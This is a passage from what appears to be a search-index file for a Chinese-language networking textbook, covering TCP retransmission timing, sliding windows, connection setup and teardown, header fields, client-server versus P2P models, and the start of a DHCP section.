RTTs\uff08\u8fd9\u4e2a\u503c\u66f4\u52a0\u5e73\u6ed1\uff09</p> <p>\u6539\u8fdb\u540e\u7684\u7b97\u6cd5 RTO = RTTs + 4 * RTTd\uff08\u504f\u5dee\u503c\u5f97\u52a0\u6743\u5e73\u5747\uff09</p> <p>\u5b9e\u9645\u4e0a\uff0cRTT \u6d4b\u91cf\u4e5f\u6bd4\u8f83\u590d\u6742\uff08\u5982\u679c\u5b58\u5728\u62a5\u6587\u7684\u4e22\u5931\u6216\u8005\u91cd\u4f20\uff0c\u8ba1\u7b97\u503c\u5c31\u53d8\u5316\uff09\u3002Karn \u7b97\u6cd5\uff1a\u5982\u679c\u51fa\u73b0\u62a5\u6587\u91cd\u4f20\uff0c\u4e0d\u8ba1\u7b97\u8fd9\u6b21\u7684 RTT\u3002\u6539\u8fdb\u7b97\u6cd5\uff1a\u91cd\u4f20\u4e00\u6b21\uff0c\u628aRTO\u589e\u5927\u4e00\u4e9b\uff08\u5178\u578b\u7b97\u6cd5\u662f\u53d8\u6210\u539f\u6765\u76842\u500d\uff09</p>"},{"location":"ebook-network-basic/05%20%E8%BF%90%E8%BE%93%E5%B1%82/#p63-57-tcp","title":"P63 5.7 TCP\u53ef\u9760\u4f20\u8f93\u7684\u5b9e\u73b0","text":"<p>TCP\u57fa\u4e8e\u5b57\u8282\u4f20\u8f93\uff0c\u7b97\u6cd5\u662f\u6ed1\u52a8\u7a97\u53e3\uff0c\u53d1\u9001\u7a97\u53e3 = min(\u63a5\u6536\u7a97\u53e3\uff0c\u62e5\u585e\u7a97\u53e3)</p> <p>\u4f7f\u7528\u4e09\u4e2a\u6307\u9488 p1p2p3 \u8fdb\u884c\u6ed1\u52a8\u7a97\u53e3</p> <ul> <li>p1 \u8868\u793a\u5df2\u7ecf\u53d1\u9001\u5e76\u786e\u8ba4\u6536\u5230\u7684\u90e8\u5206\uff08\u589e\u52a0\uff0c\u4e0d\u53d8\uff09</li> <li>p3 \u8868\u793a\u53ef\u4ee5\u53d1\u9001\u7684\u90e8\u5206 \uff08p3-p1\u5c31\u662f\u53d1\u9001\u7a97\u53e3\uff09\uff08\u589e\u52a0\uff0c\u4e0d\u53d8\uff0c\u6216\u8005\u51cf\u5c11\u2014\u2014TCP\u4e0d\u5efa\u8bae\uff09</li> <li>p2 \u5728\u4e2d\u95f4\uff0c\u8868\u793a\u53ef\u4ee5\u53d1\u9001\u7684\u90e8\u5206\u4e2d\uff0c\u5df2\u7ecf\u53d1\u9001\uff0c\u4f46\u662f\u8fd8\u6ca1\u6709\u786e\u5b9a\u6536\u5230\u7684\u90e8\u5206\uff08p3-p2 \u6709\u6548\u7a97\u53e3\u6216\u8005\u53ef\u7528\u7a97\u53e3\uff09</li> </ul> <p>\u901a\u5e38\u60c5\u51b5\u4e0b\uff0cp1 p2 p3 \u90fd\u4e0d\u65ad\u5411\u524d\u79fb\u52a8\u3002\u5f53\u62a5\u6587\u4e22\u5931\u6216\u8005\u53d1\u9001\u7a97\u53e3\u51cf\u5c0f\u65f6\uff0c\u8c03\u6574p1\u7684\u6307\u5411\u5bf9\u5e94\u7684\u5b57\u8282\u5e8f\u53f7\uff0c\u5b9e\u73b0\u53ef\u9760\u4f20\u8f93\u3002</p> <p>\u53ef\u9760\u4f20\u8f93\u7684\u5b9e\u73b0</p> <ul> <li>\u53d1\u9001\u7a97\u53e3\u6839\u636e\u63a5\u6536\u7a97\u53e3\u8bbe\u7f6e\uff0c\u4f46\u662f\u67d0\u4e2a\u65f6\u523b\uff0c\u8fd9\u4e24\u4e2a\u7a97\u53e3\u4e0d\u4e00\u5b9a\u76f8\u7b49\uff08\u65f6\u5ef6\uff0c\u62e5\u585e\uff09</li> <li>\u5982\u679c\u6570\u636e\u4e0d\u6309\u5e8f\u5230\u8fbe\uff0c\u63a5\u6536\u65b9\u5148\u653e\u5230\u4e34\u65f6\u7a97\u53e3\u4e2d\uff0c\u7b49\u524d\u9762\u7684\u63a5\u6536\u540e\uff0c\u6309\u5e8f\u4ea4\u4ed8\u7ed9\u4e0a\u5c42</li> <li>\u63a5\u6536\u65b9\u9700\u8981\u7d2f\u8ba1\u786e\u8ba4\u548c\u634e\u5e26\u786e\u8ba4\uff08\u51cf\u5c0f\u4f20\u8f93\u5f00\u652f\uff09\u4e0d\u5e94\u8be5\u8fc7\u5206\u5ef6\u8fdf\u786e\u8ba4\u62a5\u6587</li> <li>TCP\u662f\u5168\u53cc\u5de5\u901a\u4fe1\u3002\u53cc\u65b9\u90fd\u6709\u53d1\u9001\u7a97\u53e3\u548c\u63a5\u6536\u7a97\u53e3\uff0c\u9700\u8981\u533a\u5206\u3002</li> </ul>"},{"location":"ebook-network-basic/05%20%E8%BF%90%E8%BE%93%E5%B1%82/#p64-58-tcptcp-","title":"P64 5.8 TCP\u7684\u8fd0\u8f93\u8fde\u63a5\u7ba1\u7406\u2014TCP\u8fde\u63a5\u5efa\u7acb-\u4e09\u6b21\u63e1\u624b","text":"<p>TCP\u9762\u5411\u8fde\u63a5\u7684\u534f\u8bae\uff08TCP\u62a5\u6587\u6bb5\uff09\u9700\u8981\u4e09\u6b21\u63e1\u624b\u5efa\u7acb\u8fde\u63a5\uff1b\u4f20\u8f93\u6570\u636e\uff1b\u56db\u6b21\u6325\u624b\u65ad\u5f00\u8fde\u63a5</p> <p>TCP \u901a\u8fc7\u4e09\u6b21\u63e1\u624b\u5efa\u7acb\u8fde\u63a5\uff0c\u76ee\u7684\u662f\u8ba9\u53cc\u65b9\u90fd\u77e5\u9053\u5b58\u5728\uff0c\u534f\u5546\u4f20\u8f93\u53c2\u6570\uff08\u6700\u5927\u7a97\u53e3\u503c\uff0c\u7a97\u53e3\u6269\u5927\u9009\u9879\uff09</p> <p>TCP\u670d\u52a1\u7aef\u548c\u5ba2\u6237\u7aef\u8fdb\u7a0b\u5148\u90fd\u6253\u5f00\uff0c\u670d\u52a1\u7aef\u76d1\u542c\u6d88\u606f</p> <p>1\u3001\u5ba2\u6237\u7aef\u53d1\u9001 TCP \u8fde\u63a5\u8bf7\u6c42\uff08SYN=1\uff0cseq=x\uff09\u8fdb\u5165\u540c\u6b65\u5df2\u53d1\u9001\u72b6\u6001</p> <p>2\u3001\u670d\u52a1\u5668\u6536\u5230\u540e\uff0c\u8fdb\u5165\u540c\u6b65\u5df2\u63a5\u6536\u72b6\u6001\uff0c\u53d1\u9001 SYN = 1,ACK = 1 seq=y, ack = x+1</p> <p>3\u3001\u5ba2\u6237\u7aef\u6536\u5230\u540e\uff0c\u8fdb\u5165\u8fde\u63a5\u5df2\u5efa\u7acb\uff0cACK=1\uff0cseq = x + 1, ack = y + 1\uff0c\u670d\u52a1\u7aef\u6536\u5230\u540e\u5efa\u7acb\u8fde\u63a5\uff08ack\u662f\u5bf9\u4e0a\u4e00\u4e2aseq\u7684\u786e\u8ba4\uff0cack = seq + 1\uff09</p> <p>\u7b2c\u4e09\u6b21\u8fde\u63a5\u4e0d\u80fd\u5c11\u7684\u539f\u56e0\uff1a\u5982\u679c\u7b2c\u4e00\u6b21\u8fde\u63a5A\u53d1\u9001\u540e\uff0c\u5ef6\u8fdf\u4e86\u3002\u53c8\u53d1\u51fa\u4e86\u4e00\u4e2a\u8fde\u63a5B\uff0c\u8fd9\u4e2a\u8fde\u63a5\u5efa\u7acb\u540e\u5e76\u91ca\u653e\u540e\uff0cA\u8fde\u63a5\u624d\u5230\u8fbe\u670d\u52a1\u7aef\uff0c\u8fd9\u6837\u670d\u52a1\u7aef\u4f1a\u7ee7\u7eed\u6253\u5f00\uff0c\u6d6a\u8d39\u670d\u52a1\u7aef\u7684\u6027\u80fd\u3002\u6240\u4ee5\u9700\u8981\u7b2c\u4e09\u6b21\u8fde\u63a5\uff08\u4e3a\u4e86\u9632\u6b62\u5931\u6548\u7684\u8fde\u63a5\u8bf7\u6c42\u7a81\u7136\u4f20\u5230\u670d\u52a1\u7aef\uff0c\u9020\u6210\u9519\u8bef\uff09\u3002</p> <p>\u6ce8\u610f\uff1a</p> <p>1\u3001SYN=1\u7684\u62a5\u6587\u6bb5\uff0c\u4e0d\u80fd\u643a\u5e26\u6570\u636e\uff0c\u4f46\u662f\u6d88\u8017\u4e00\u4e2a\u5e8f\u53f7</p> <p>2\u3001\u666e\u901a\u7684\u786e\u8ba4\u62a5\u6587\u6bb5\uff0c\u5982\u679c\u4e0d\u643a\u5e26\u6570\u636e\uff0c\u4e0d\u6d88\u8017\u5e8f\u53f7</p>"},{"location":"ebook-network-basic/05%20%E8%BF%90%E8%BE%93%E5%B1%82/#p65-58-tcptcp-","title":"P65 5.8 TCP\u7684\u8fd0\u8f93\u8fde\u63a5\u7ba1\u7406\u2014TCP\u8fde\u63a5\u91ca\u653e-\u56db\u6b21\u6325\u624b","text":"<p>TCP \u901a\u8fc74\u62a5\u6587\u6325\u624b\u5b9e\u73b0\u8fde\u63a5\u91ca\u653e\uff08\u65ad\u5f00\u8fde\u63a5\uff09</p> <p>1\u3001\u5ba2\u6237\u7aef\u4e3b\u52a8\u5173\u95ed\u6570\u636e\u4f20\u8f93\uff0c\u53d1\u9001\u7b2c\u4e00\u4e2a\u62a5\u6587\uff08\u6211\u5df2\u7ecf\u4e0d\u53d1\u9001\u62a5\u6587\u4e86\uff0c\u53ef\u4ee5\u63a5\u6536\uff09</p> <p>2\u3001\u670d\u52a1\u5668\u6536\u5230\u540e\uff0c\u53d1\u9001\u4e00\u4e2a\u54cd\u5e94\u62a5\u6587\uff08\u597d\u7684\uff0c\u670d\u52a1\u5668\u7aef\u77e5\u9053\u4e86\uff09\u6b64\u65f6\u670d\u52a1\u5668\u7aef\u8fd8\u53ef\u4ee5\u53d1\u9001\u6570\u636e\u3002</p> <p>3\u3001\u5f53\u670d\u52a1\u5668\u53d1\u9001\u5b8c\u62a5\u6587\u540e\uff0c\u88ab\u52a8\u5173\u95ed\uff0c\u53d1\u9001\u4e00\u4e2a\u62a5\u6587\uff08\u670d\u52a1\u7aef\u8981\u5173\u95ed\u4e86\uff09</p> <p>4\u3001\u5ba2\u6237\u7aef\u63a5\u6536\u5230\u62a5\u6587\u540e\uff0c\u53d1\u9001\u7ed9\u670d\u52a1\u7aef\u786e\u8ba4\u62a5\u6587\uff08\u670d\u52a1\u7aef\u53ef\u4ee5\u5173\u95ed\u4e86\uff09</p> <p>5\u3001\u670d\u52a1\u7aef\u5173\u95ed\u3002\u5ba2\u6237\u7aef\u7b49\u5f854\u5206\u949f\u540e\uff082MSL\uff0c\u6700\u957f\u62a5\u6587\u6bb5\u5bff\u547d\uff0c\u901a\u5e38\u662f4\u5206\u949f\uff09\u5173\u95ed\u72b6\u6001\u3002</p> <p>\u5ba2\u6237\u7aef\u7b49\u5f852MSL\u7684\u5fc5\u8981\u6027\uff1a\u907f\u514d\u5ba2\u6237\u7aef\u6700\u540e\u4e00\u4e2a\u62a5\u6587\u4e2d\u9014\u4e22\u5931\uff0c\u9020\u6210\u670d\u52a1\u7aef\u7ee7\u7eed\u53d1\u9001\u8d85\u65f6\u91cd\u4f20\u62a5\u6587\uff0c\u9020\u6210\u670d\u52a1\u7aef\u6027\u80fd\u6d6a\u8d39\u3002</p> <p>\u4fdd\u6d3b\u8ba1\u65f6\u5668\uff1aTCP\u670d\u52a1\u5668\u7aef\u6536\u5230\u6570\u636e\u540e\uff0c\u91cd\u7f6e\u62a5\u6d3b\u8ba1\u65f6\u5668\u3002\u5982\u679c\u5ba2\u6237\u7aef\u51fa\u73b0\u6545\u969c\uff0c\u65e0\u6cd5\u53d1\u9001\u62a5\u6587\u3002\u90a3\u4e48\u62a5\u6d3b\u8ba1\u65f6\u5668\u4e00\u5b9a\u65f6\u95f4\u540e\u6ca1\u6709\u6536\u5230\u6570\u636e\uff0c\u5c31\u5411\u5ba2\u6237\u7aef\u53d1\u9001\u63a2\u6d4b\u62a5\u6587\u6bb5\uff0c\u6bcf\u969475s\u53d1\u9001\u4e00\u4e2a\u63a2\u6d4b\u62a5\u6587\u6bb5\u3002\u5982\u679c\u53d1\u900110\u4e2a\u63a2\u6d4b\u62a5\u6587\u6bb5\u65e0\u54cd\u5e94\uff0c\u670d\u52a1\u5668\u8fdb\u7a0b\u5c31\u8ba4\u4e3a\u5ba2\u6237\u7aef\u8fdb\u7a0b\u6240\u5728\u4e3b\u673a\u6545\u969c\u4e86\uff0c\u5173\u95ed\u8fd9\u4e2aTCP\u8fde\u63a5\u3002</p>"},{"location":"ebook-network-basic/05%20%E8%BF%90%E8%BE%93%E5%B1%82/#p66-59-tcp","title":"P66 5.9 TCP\u62a5\u6587\u6bb5\u7684\u9996\u90e8\u683c\u5f0f","text":"<p>TCP \u53ef\u9760\u4f20\u8f93\u57fa\u4e8e\u9762\u5411\u5b57\u8282\u6d41\uff1a\u53d1\u9001\u6570\u636e\u65f6\uff0c\u4ece\u53d1\u9001\u7f13\u5b58\u4e2d\u53d6\u51fa\u5168\u90e8\u6216\u8005\u90e8\u5206\u6570\u636e\uff0c\u7136\u540e\u7ed9\u5176\u52a0\u4e00\u4e2a\u9996\u90e8\u6210\u4e3a TCP \u62a5\u6587\u6bb5\u3002TCP \u7684\u5168\u90e8\u529f\u80fd\u4f53\u73b0\u5728\u9996\u90e8\u7684\u5404\u5b57\u6bb5\u4e2d\u3002</p> <p>TCP\u62a5\u6587\u6bb5 = \u9996\u90e8+\u6570\u636e\u8f7d\u8377</p> <p>\u9996\u90e8 = \u56fa\u5b9a\u9996\u90e8\uff0820\u5b57\u8282\uff09+\u6269\u5c55\u9996\u90e8\uff08\u5c0f\u4e8e40\u5b57\u8282\uff09</p> <p>\u9996\u90e8\u683c\u5f0f\u5b57\u6bb5</p> <ul> <li>\u6e90\u7aef\u53e3\uff08\u4f8b\u5982\u6d4f\u89c8\u5668\u8fdb\u7a0b\u7aef\u53e3\u53f749152\uff09 </li> <li>\u76ee\u7684\u7aef\u53e3\uff08\u4f8b\u5982\u670d\u52a1\u5668\u7aef\u53e3\u53f780\uff09</li> <li>\u5e8f\u53f7\uff08\u5f53\u524dTCP\u62a5\u6587\u6bb5\u4e2d\uff0c\u6570\u636e\u8f7d\u8377\u7684\u7b2c\u4e00\u4e2a\u5b57\u8282\u7684\u5e8f\u53f7\uff09 \u8d85\u51fa 2^32 \u540e\u91cd\u7f6e\u4e3a0</li> <li>\u786e\u8ba4\u53f7N\uff1a\u5bf9\u4e4b\u524d\u6240\u6709\u6536\u5230\u6570\u636e\u7684\u786e\u8ba4\uff0c\u5df2\u7ecf\u6536\u5230N-1\u4e4b\u524d\u5168\u90e8\u6570\u636e\uff08\u5df2\u7ecf\u6b63\u786e\u63a5\u6536\uff09\uff0c\u671f\u671b\u6536\u5230\u4e0b\u4e00\u4e2aTCP\u5e8f\u53f7\u662fN</li> <li>ACK \u786e\u8ba4\u6807\u5fd7\u4f4d\uff1a\u5982\u679c\u662f1\uff0c\u786e\u8ba4\u53f7\u5b57\u6bb5\u6709\u6548\uff1b\u5982\u679c\u662f0\uff0c\u786e\u8ba4\u53f7\u5b57\u6bb5\u65e0\u6548\u3002TCP \u89c4\u5b9a\uff0c\u8fde\u63a5\u5efa\u7acb\u540e\uff0c\u6240\u6709\u4f20\u9001\u7684TCP\u62a5\u6587\u6bb5 ACK \u5fc5\u987b\u662f1.</li> <li>\u6570\u636e\u504f\u79fb\uff1a4\u6bd4\u7279\uff1b\u4ee5\u56db\u5b57\u8282\u4e3a\u5355\u4f4d\u3002\u56e0\u4e3aTCP\u62a5\u6587\u6bb5\u6709\u6269\u5c55\u9996\u90e8\uff0c\u6240\u4ee5\u9996\u90e8\u957f\u5ea6\u4e0d\u786e\u5b9a\u3002\u8fd9\u4e2a\u5b57\u6bb5\u6307\u51fa\u4e86TCP\u62a5\u6587\u6bb5\u7684\u9996\u90e8\u957f\u5ea6\uff08TCP\u6570\u636e\u8f7d\u8377\u90e8\u5206\u7684\u8d77\u59cb\u4f4d\u7f6e\u8ddd\u79bbTCP\u62a5\u6587\u6bb5\u7684\u8d77\u59cb\u5904\u7684\u4f4d\u7f6e\uff09\u5982\u679cTCP\u9996\u90e8\u662f20\u5b57\u8282\uff0c\u90a3\u4e48\u6570\u636e\u504f\u79fb\u662f 0101\uff0c\u5982\u679c\u9996\u90e8\u662f 40 \u5b57\u8282\uff0c\u90a3\u4e48\u6570\u636e\u504f\u79fb\u662f 1111</li> <li>\u4fdd\u7559\uff1a\u76ee\u524d\u662f0\uff0c\u4ee5\u540e\u4f7f\u7528</li> <li>\u7a97\u53e3\uff1a\u53d1\u9001\u65b9\u7684\u63a5\u6536\u7a97\u53e3\uff0c\u63a5\u6536\u65b9\u6839\u636e\u8fd9\u4e2a\u5b57\u6bb5\uff0c\u8bbe\u7f6e\u53d1\u9001\u7a97\u53e3\uff0c\u8fdb\u884c\u6d41\u91cf\u63a7\u5236\u3002\u5b9e\u9645\u4e0a\u53d1\u9001\u7a97\u53e3 = min(\u63a5\u6536\u7a97\u53e3\uff0c\u62e5\u585e\u7a97\u53e3)</li> <li>\u6821\u9a8c\u548c\uff1a16\u6bd4\u7279\uff0c\u68c0\u67e5TCP\u62a5\u6587\u6bb5\u7684\u9996\u90e8\u548c\u6570\u636e\u8f7d\u8377\u90e8\u5206\uff08\u68c0\u6d4b\u662f\u5426\u6709\u8bef\u7801\u7b49\uff09</li> <li>SYN\uff08sync\uff09\uff1a\u540c\u6b65\u6807\u5fd7\u4f4d\uff0c\u7528\u4e8eTCP\u8fde\u63a5\u5efa\u7acb\u65f6\u540c\u6b65\u5e8f\u53f7\uff08\u4e09\u6b21\u63e1\u624b\u9700\u8981SYN\u5b57\u6bb5\uff09</li> <li>FIN\uff08finish\uff09\uff1a\u7ec8\u6b62\u6807\u5fd7\u4f4d\uff0c\u7528\u4e8e\u91ca\u653eTCP\u8fde\u63a5\uff08\u56db\u6b21\u6325\u624b\u9700\u8981FIN\u5b57\u6bb5\uff09</li> <li>RST\uff08reset\uff09\u590d\u4f4dTCP\uff0c\u5982\u679c\u662f1\uff0c\u8868\u793aTCP\u8fde\u63a5\u5f02\u5e38\uff0c\u9700\u8981\u91ca\u653e\u8fde\u63a5\u5e76\u91cd\u65b0\u5efa\u7acb</li> <li>PSH\uff08push\uff09\u63a8\u9001\u6807\u5fd7\u4f4d\uff0c\u5982\u679c\u662f1\uff0c\u63a5\u6536\u65b9\u9700\u8981\u5c3d\u5feb\u4e0a\u4ea4\u62a5\u6587\u7ed9\u4e0a\u5c42\u8fdb\u7a0b\uff0c\u4e0d\u9700\u8981\u7b49\u5f85\u63a5\u6536\u7f13\u5b58\u90fd\u586b\u5145\u540e\u518d\u4ea4\u4ed8\u3002</li> <li>URG(urgent) \u7d27\u6025\u6807\u5fd7\u4f4d\uff0c\u5982\u679c\u662f1\uff0c\u7d27\u6025\u6307\u9488\u5b57\u6bb5\u6709\u6548</li> <li>\u7d27\u6025\u6307\u9488\uff1a\u8868\u660e\u7d27\u6025\u6570\u636e\u7684\u957f\u5ea6\u3002\u5982\u679c\u53d1\u9001\u65b9\u6709\u7d27\u6025\u6570\u636e\uff0c\u53ef\u4ee5\u5c06\u7d27\u6025\u6570\u636e\u63d2\u961f\u653e\u5230\u6700\u524d\u9762\uff0c\u7acb\u5373\u5206\u88c5\u6210TCP\u62a5\u6587\u6bb5\u53d1\u9001\u3002\u7d27\u6025\u6307\u9488\u8868\u793a\uff0c\u672c\u62a5\u6587\u4e2d\u6570\u636e\u8f7d\u8377\u4e2d\u6709N\u957f\u5ea6\u7684\u7d27\u6025\u6570\u636e\uff0c\u540e\u9762\u662f\u666e\u901a\u6570\u636e\u3002</li> <li>\u5176\u4ed6\u5b57\u6bb5\uff1a\u6700\u5927\u62a5\u6587\u6bb5\u957f\u5ea6MSS\uff08\u6570\u636e\u8f7d\u8377\u6700\u5927\u503c\uff09\uff0c\u7a97\u53e3\u6269\u5927\u9009\u9879\uff08\u63d0\u9ad8\u541e\u5410\u7387\uff09\uff1b\u65f6\u95f4\u6233\uff08\u8ba1\u7b97RTT\uff09\uff1b\u9009\u62e9\u786e\u8ba4\u9009\u9879\u7b49\u3002</li> <li>\u586b\u5145\uff1a\u56e0\u4e3a\u5176\u4ed6\u5b57\u6bb5\u957f\u5ea6\u53ef\u53d8\uff0c\u4e3a\u4e86\u786e\u4fdd\u62a5\u6587\u6bb5\u80fd\u88ab4\u6574\u9664\uff08\u6570\u636e\u9996\u90e8\u957f\u5ea6\u662f\u4ee54\u5b57\u8282\u4e3a\u5355\u4f4d\u7684\uff09\u7528\u7a7a\u767d\u503c\u586b\u5145\u957f\u5ea6</li> </ul> <p>\u4f8b\u5982\u4e00\u4e2a\u62a5\u6587\uff1a\u5e8f\u53f7201\uff1b\u6570\u636e\u8f7d\u8377\u957f\u5ea6100\u5b57\u8282\uff1b\u786e\u8ba4\u53f7800\uff0cACK\u662f1</p>"},{"location":"ebook-network-basic/06%20%E5%BA%94%E7%94%A8%E5%B1%82/","title":"06 \u5e94\u7528\u5c42","text":""},{"location":"ebook-network-basic/06%20%E5%BA%94%E7%94%A8%E5%B1%82/#_1","title":"\u7b2c\u516d\u7ae0 \u5e94\u7528\u5c42","text":"<p>\u7edf\u8ba1\u4fe1\u606f\uff1a\u5b57\u6570 17362  \u9605\u8bfb35\u5206\u949f</p>"},{"location":"ebook-network-basic/06%20%E5%BA%94%E7%94%A8%E5%B1%82/#61","title":"6.1 \u5e94\u7528\u5c42\u6982\u8ff0","text":"<p>\u8ba1\u7b97\u673a\u7f51\u7edc\u7684\u4e0b\u5c42\u5b9e\u73b0\uff0c\u90fd\u662f\u4e3a\u5e94\u7528\u5c42\u505a\u57fa\u7840\u5de5\u4f5c\uff1b\u5e94\u7528\u5c42\u7684\u529f\u80fd\u590d\u6742\uff0c\u534f\u8bae\u5f88\u591a\u3002\u8fd9\u4e00\u5f20\u6bcf\u4e00\u8282\u4f1a\u4ecb\u7ecd\u4e0d\u540c\u529f\u80fd\u7684\u5177\u4f53\u4f7f\u7528\u548c\u5bf9\u5e94\u7684\u534f\u8bae\u3002</p> <p>\u7269\u7406\u5c42\uff1a\u89e3\u51b3\u4f7f\u7528\u4f55\u79cd\u4fe1\u53f7\u6765\u4f20\u9012\u6bd4\u7279\u6d41\u7684\u95ee\u9898</p> <p>\u6570\u636e\u94fe\u8def\u5c42\uff1a\u89e3\u51b3\u5206\u7ec4\u5728\u4e00\u4e2a\u7f51\u7edc\u6216\u8005\u4e00\u6bb5\u94fe\u8def\u4e0a\u4f20\u8f93\u7684\u95ee\u9898</p> <p>\u7f51\u7edc\u5c42\uff1a\u89e3\u51b3\u5206\u7ec4\u5728\u591a\u4e2a\u7f51\u7edc\u4e0a\u4f20\u8f93\u8def\u7531\u7684\u95ee\u9898</p> <p>\u8fd0\u8f93\u5c42\uff1a\u89e3\u51b3\u8fdb\u7a0b\u4e4b\u95f4\u57fa\u4e8e\u7f51\u7edc\u7684\u901a\u4fe1\u95ee\u9898</p> <p>\u5e94\u7528\u5c42\uff1a\u89e3\u51b3\u901a\u8fc7\u5e94\u7528\u8fdb\u7a0b\u7684\u4ea4\u4e92\u6765\u5b9e\u73b0\u7279\u5b9a\u7f51\u7edc\u5e94\u7528\u7684\u95ee\u9898</p> <p>\u5e94\u7528\u5c42\uff1a\u8ba1\u7b97\u673a\u4f53\u7cfb\u7ed3\u6784\u6700\u9876\u5c42\uff1b\u8bbe\u8ba1\u548c\u5efa\u7acb\u8ba1\u7b97\u673a\u7f51\u7edc\u7684\u6700\u7ec8\u76ee\u7684</p>"},{"location":"ebook-network-basic/06%20%E5%BA%94%E7%94%A8%E5%B1%82/#62-bs-p2p","title":"6.2 \u5ba2\u6237\u7aef\u2014\u670d\u52a1\u5668\u65b9\u5f0f\u548c\u5bf9\u7b49\u65b9\u5f0f-BS \u548c P2P","text":"<p>CS \u6a21\u5f0f\uff1a\u5ba2\u6237\u7aef\u548c\u670d\u52a1\u5668\uff1a\u662f\u8fdb\u7a0b\u4e4b\u95f4\u670d\u52a1\u548c\u88ab\u670d\u52a1\u7684\u5173\u7cfb\uff08WWW\uff0cFTP\uff0cPOP3\uff09\u3002</p> <p>\u5ba2\u6237\u662f\u670d\u52a1\u8bf7\u6c42\u65b9\uff0c\u670d\u52a1\u5668\u662f\u670d\u52a1\u63d0\u4f9b\u65b9\u3002\u670d\u52a1\u5668\u59cb\u7ec8\u8fd0\u884c\uff0c\u5e76\u7b49\u5f85\u5ba2\u6237\u7684\u670d\u52a1\u8bf7\u6c42\u3002\u670d\u52a1\u5668\u6709\u56fa\u5b9a\u7684\u7aef\u53e3\u53f7\uff0c\u8fd0\u884c\u670d\u52a1\u5668\u7684\u4e3b\u673a\u4e5f\u6709\u56fa\u5b9a\u7684IP\u5730\u5740\u3002</p> <p>CS\u7684\u670d\u52a1\u662f\u670d\u52a1\u96c6\u4e2d\u578b\u7684\uff0c\u5ba2\u6237\u7aef\u6bd4\u8f83\u591a\uff0c\u670d\u52a1\u5668\u6bd4\u8f83\u5c11\u3002\u901a\u5e38\u4e00\u53f0\u670d\u52a1\u5668\u4e3a\u591a\u4e2a\u5ba2\u6237\u7aef\u63d0\u4f9b\u670d\u52a1\uff0c\u53ef\u80fd\u51fa\u73b0\u670d\u52a1\u5668\u8ddf\u4e0d\u4e0a\u591a\u4e2a\u5ba2\u6237\u7aef\u8bf7\u6c42\u7684\u60c5\u51b5\uff0c\u6240\u4ee5\u4f7f\u7528\u96c6\u7fa4\u6216\u8005\u670d\u52a1\u5668\u573a\u6765\u6784\u5efa\u5f3a\u5927\u7684\u865a\u62df\u670d\u52a1\u5668\u3002</p> <p>P2P \u6ca1\u6709\u56fa\u5b9a\u7684\u670d\u52a1\u8bf7\u6c42\u8005\u548c\u670d\u52a1\u63d0\u4f9b\u8005\uff0c\u7f51\u7edc\u4e2d\u5404\u4e2aP2P\u5e94\u7528\u7a0b\u5e8f\u662f\u5bf9\u7b49\u7684\uff0c\u5bf9\u7b49\u65b9\u4e4b\u95f4\u76f4\u63a5\u901a\u4fe1\uff0c\u6bcf\u4e00\u4e2a\u5bf9\u7b49\u65b9\u662f\u670d\u52a1\u7684\u8bf7\u6c42\u8005\u548c\u63d0\u4f9b\u8005\uff08\u6587\u4ef6\u5171\u4eab\uff0c\u8fc5\u96f7\uff09\u3002</p> <p>P2P\u662f\u670d\u52a1\u5206\u6563\u578b\u7684\uff0c\u670d\u52a1\u4e0d\u662f\u96c6\u4e2d\u5728\u5c11\u6570\u51e0\u4e2a\u670d\u52a1\u5668\u8ba1\u7b97\u673a\u4e2d\uff0c\u800c\u662f\u5206\u6563\u5728\u5927\u91cf\u5bf9\u7b49\u8ba1\u7b97\u673a\u4e2d\u3002\u7279\u70b9\uff1a\u53ef\u6269\u5c55\u6027\u597d\uff0c\u589e\u52a0\u5bf9\u7b49\u65b9\u65f6\uff0c\u540c\u65f6\u589e\u52a0\u670d\u52a1\u7684\u63d0\u4f9b\u8005\u548c\u8bf7\u6c42\u8005\uff0c\u7cfb\u7edf\u6027\u80fd\u4e0d\u4f1a\u56e0\u4e3a\u89c4\u6a21\u6269\u5927\u800c\u964d\u4f4e\uff0c\u8fd9\u6837\u6210\u672c\u4e0a\u6709\u4f18\u52bf\uff0c\u4e0d\u9700\u8981\u66f4\u591a\u7684\u670d\u52a1\u5668\u8bbe\u65bd\u548c\u670d\u52a1\u5668\u5e26\u5bbd\u3002</p>"},{"location":"ebook-network-basic/06%20%E5%BA%94%E7%94%A8%E5%B1%82/#63-dhcp","title":"6.3 \u52a8\u6001\u4e3b\u673a\u914d\u7f6e\u534f\u8baeDHCP","text":"<p>\u5b9e\u9645\u7684\u95ee\u9898\uff1a\u5982\u679c\u4e00\u4e2a\u5c40\u57df\u7f51\u4e2d\u591a\u4e2a\u4e3b\u673a\uff0c\u5982\u4f55\u914d\u7f6eIP\uff0c\u624d\u80fd\u4f7f\u5f97\u5ba2\u6237\u4e3b\u673a\u6b63\u5e38\u8bbf\u95ee\u670d\u52a1\u5668\uff1f\u53ef\u4ee5\u624b\u52a8\u914d\u7f6e\uff0c\u4f46\u662f\u914d\u7f6e\u6bd4\u8f83\u9ebb\u70e6\u3002DHCP \u52a8\u6001\u4e3b\u673a\u914d\u7f6e\u534f\u8bae\u5c31\u662f\u81ea\u52a8\u914d\u7f6e IP \u7684\u670d\u52a1\u3002\u5728\u5c40\u57df\u7f51\u4e2d\u589e\u52a0\u4e00\u4e2a DHCP \u670d\u52a1\u5668\u63d0\u4f9b\u670d\u52a1\u3002\u5ba2\u6237\u5411 DHCP \u670d\u52a1\u5668\u8bf7\u6c42\u81ea\u5df1\u7684\u7f51\u7edc\u914d\u7f6e\u4fe1\u606f\u5373\u53ef\u3002</p> <p>DHCP \u63d0\u4f9b\u4e86\u5373\u63d2\u5373\u7528\u8054\u7f51\uff1a\u5141\u8bb8\u4e00\u53f0\u8ba1\u7b97\u673a\uff0c\u52a0\u5165\u65b0\u7f51\u7edc\u65f6\uff0c\u53ef\u81ea\u52a8\u83b7\u53d6IP\u5730\u5740\u7b49\u7f51\u7edc\u914d\u7f6e\u4fe1\u606f\uff0c\u800c\u4e0d\u662f\u4e0a\u624b\u52a8\u53c2\u4e0e\uff08Dynamic Host Configuration Protocol\uff09\u3002</p> <p>DHCP \u62a5\u6587\u5728\u8fd0\u8f93\u5c42\u5c01\u88c5\u6210 UDP \u7528\u6237\u6570\u636e\u62a5\u3002\u5ba2\u6237\u7aef\u901a\u8fc7 UDP 68 \u7aef\u53e3\u53d1\u9001\u62a5\u6587\uff0c\u670d\u52a1\u5668\u901a\u8fc7 UDP 67 